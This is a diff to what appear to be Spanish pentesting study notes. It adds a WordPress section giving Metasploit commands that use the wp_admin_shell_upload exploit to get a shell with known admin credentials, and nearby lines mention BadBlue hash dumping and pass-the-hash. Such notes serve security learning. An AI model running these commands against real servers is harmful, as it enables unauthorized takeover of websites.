@@ -27,6 +27,21 @@ Si ya tenemos una sesión activa como root, podemos usar el siguiente modulo par
 ```
 ## HTTP 80
 
+## WordPress
+
+```bash 
+# Explotaremos WordPress
+❯ msfconsole -q                  # q = Quitar el banner de inicio
+
+	❯ use exploit/unix/webapp/wp_admin_shell_upload         # Usamos el exploit                
+	❯ options
+	❯ set PASSWORD ❮passwd❯                                 # Colocamos la passwd con la que ingresamos a WordPress
+	❯ set USERNAME ❮user❯                                 # Colocamos el usuario con la que ingresamos a WordPress
+	❯ set RHOSTS ❮IP❯     
+	❯ set WPCHECK False              
+	❯ exploit
+```
+
 ## BadBlue 2.7 Windows 
 
 Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también hacer 'pass the hash'. 
